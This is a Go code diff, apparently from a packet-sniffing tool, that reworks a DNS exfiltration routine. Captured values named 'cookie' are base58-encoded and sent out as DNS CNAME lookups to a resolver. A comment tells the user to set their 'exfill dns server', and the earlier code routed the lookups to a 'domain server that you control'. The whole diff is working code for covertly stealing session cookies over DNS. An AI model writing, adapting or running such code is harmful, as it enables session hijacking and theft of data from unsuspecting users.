@@ -17,18 +17,23 @@ import (
 	"github.com/google/gopacket/pcap"
 )
 
-func CustomDialer(ctx context.Context, network, address string) (net.Conn, error) {
-	dialer := net.Dialer{}
-	return dialer.DialContext(ctx, "udp", "127.0.0.1:53")
+func GoogleDNSDialer(ctx context.Context, network, address string) (net.Conn, error) {
+	d := net.Dialer{}
+	// you have to set your exfill dns server
+	return d.DialContext(ctx, "udp", "127.0.0.1:53")
 }
 
 func DnsQuery(host string) {
-	resolver := &net.Resolver{
+	const timeout = 1000 * time.Millisecond
+	ctx, cancel := context.WithTimeout(context.TODO(), timeout)
+	defer cancel()
+	resolver := net.Resolver{
 		PreferGo: true,
-		Dial:     CustomDialer,
+		Dial:     GoogleDNSDialer,
 	}
-
-	ip, err := resolver.LookupHost(context.Background(), host)
+	fmt.Println(host)
+	// each part of a domain must be smaller than 63 bytes. Watch out.
+	ip, err := resolver.LookupCNAME(ctx, host)
 	if err != nil {
 		fmt.Println(err)
 	} else {
@@ -38,8 +43,7 @@ func DnsQuery(host string) {
 
 func pumpOutChannel(messages chan string) {
 	for cookie := range messages {
-		// TODO domain server that you control
-		dnsName := fmt.Sprintf("%s.example.org", base58.Encode([]byte(cookie)))
+		dnsName := base58.Encode([]byte(cookie))
 		DnsQuery(dnsName)
 	}
 }
